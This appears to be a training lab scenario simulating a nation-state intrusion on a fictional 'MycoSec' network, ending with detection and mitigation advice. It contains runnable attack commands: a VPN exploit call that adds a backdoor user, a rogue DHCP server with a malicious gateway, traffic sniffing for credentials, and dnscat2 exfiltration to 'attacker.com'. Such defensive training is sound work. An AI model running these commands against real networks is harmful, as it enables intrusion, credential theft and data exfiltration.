# Operation DHCP Deception

Objective: Simulate a nation-state adversary subverting VPN integrity and DHCP trust to intercept traffic, harvest credentials, and pivot into protected research resources, culminating in the exfiltration of cryptographic project data.

Scenario: The [MycoSec](entity.md) lab network relies on VPN gateways for remote access and DHCP for address assignment. Development workstations and research servers are segmented but reachable through trusted routing paths. By exploiting a VPN vulnerability and deploying a rogue DHCP service, the adversary reroutes internal traffic, intercepts sensitive communications, and leverages stolen credentials to compromise a high-value research server.

## Adversary profile

- Designation: APT-29 ("Shadow Hydra")
- Level: Nation-state sophistication
- Primary TTPs: 
  - T1190 (Exploit Public-Facing Application)
  - T1040 (Network Sniffing) 
  - T1557 (Adversary-in-the-Middle)
  - T1098 (Account Manipulation)
- Motivation: Steal simulated research data on MycoSec's cryptographic projects by compromising VPN integrity and pivoting to internal resources.

## Phase 1: Reconnaissance (T1590/T1595)

Objective: Identify VPN endpoints, DHCP services, and internal network topology.

1.  Scan for VPN Endpoints:
    ```bash
    nmap -sS -p 443,1194,51820 192.168.1.0/24 -oN vpn_scan.txt
    ```
    - Finding: OpenVPN UDP/1194 and WireGuard UDP/51820 detected at `192.168.1.5`.

2.  Discover DHCP Services:
    ```bash
    nmap -sU -p 67,68 192.168.1.0/24 --script dhcp-discover
    ```
    - Finding: DHCP server at `192.168.1.1` (router).

3.  Map Internal Routes:
    ```bash
    traceroute -n 192.168.2.100  # Internal research server
    ```
    - Finding: Traffic routes via `192.168.1.1` (gateway).

Detection Evasion: Use fragmented packets and random scan delays to avoid SIEM alerts.

## Phase 2: Initial Access (T1190)
Objective: Compromise the VPN gateway using a known vulnerability.

1.  Exploit CVE-2023-46805 (Ivanti VPN Auth Bypass):
    ```bash
    python3 ivanti_exploit.py --target 192.168.1.5 --command "useradd -m backdoor"
    ```
2.  Establish Foothold:
    ```bash
    ssh backdoor@192.168.1.5  # Password: default compromised
    ```
3.  Extract VPN Configs:
    ```bash
    cat /etc/openvpn/server.conf  # Reveals internal IP range: 192.168.2.0/24
    ```

Persistence: Add SSH key to `authorized_keys` for reliable access.

## Phase 3: DHCP Spoofing (T1557)
Objective: Become the rogue DHCP server to hijack traffic.

1.  Deploy Rogue DHCP Server (using `dnsmasq`):
    ```bash
    dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200,24h \
            --dhcp-option=121,0.0.0.0/0,192.168.1.254  # Malicious gateway
    ```
2.  Force Client Renewals:
    ```bash
    dhcping -s 192.168.1.254 -c 192.168.1.50  # Target research workstation
    ```
3.  Verify Hijacking:
    ```bash
    ip route show  # On target: default via 192.168.1.254 (attacker)
    ```

Impact: 100% of lab VPN traffic now routes through attacker-controlled node.

## Phase 4: Traffic Interception (T1040)
Objective: Decrypt and analyse redirected traffic.

1.  Enable IP Forwarding (maintain stealth):
    ```bash
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -A POSTROUTING -j MASQUERADE
    ```
2.  Capture Plaintext Data:
    ```bash
    tcpdump -i eth0 -w intercepted.pcap host 192.168.2.100 and port 80
    ```
3.  Harvest Credentials:
    - Analyse HTTP packets in Wireshark for basic auth strings.

Critical Finding: Simulated credentials `researcher:MycoSec2025!` extracted from HTTP login.

## Phase 5: Lateral Movement (T1021)
Objective: Pivot to the research server (`192.168.2.100`).

1.  SSH Access:
    ```bash
    ssh researcher@192.168.2.100  # Using stolen credentials
    ```
2.  Explore Critical Data:
    ```bash
    find /opt/mycosectest -name "*.pdf" -o -name "*.zip"  # Research archives
    ```
3.  Exfiltrate via DNS Tunneling (evade detection):
    ```bash
    dnscat2 --dns server=attacker.com,port=53 --secret=myco_exfil
    ```

Data Stolen: 2.5 GB of simulated cryptographic research data.

## Defensive Detection & Mitigation

### Detection points
1.  DHCP Snooping Alert: Unauthorised DHCP server detected at `192.168.1.254`.
2.  VPN Auth Anomaly: Multiple failed logins followed by success from unusual IP.
3.  DNS Exfiltration Alert: Unusual DNS query volume to `attacker.com`.

## Mitigations
- Implement DHCP Snooping on network switches to block rogue servers.
- Enforce MFA for VPN access to prevent credential exploitation.
- Segment Networks to restrict lateral movement (e.g., VLANs for research servers).
- Monitor DNS Traffic for anomalous patterns (e.g., high volume of TXT queries).

## Instructor Notes
- Lab Safety: All attacks confined to isolated VLANs (no production risk).
- Tools Provided:
  - `ivanti_exploit.py` (simulated CVE-2023-46805)
  - `dnsmasq` for DHCP spoofing
  - `dnscat2` for exfiltration
- Variants: Try WireGuard instead of OpenVPN to compare exploitation techniques.
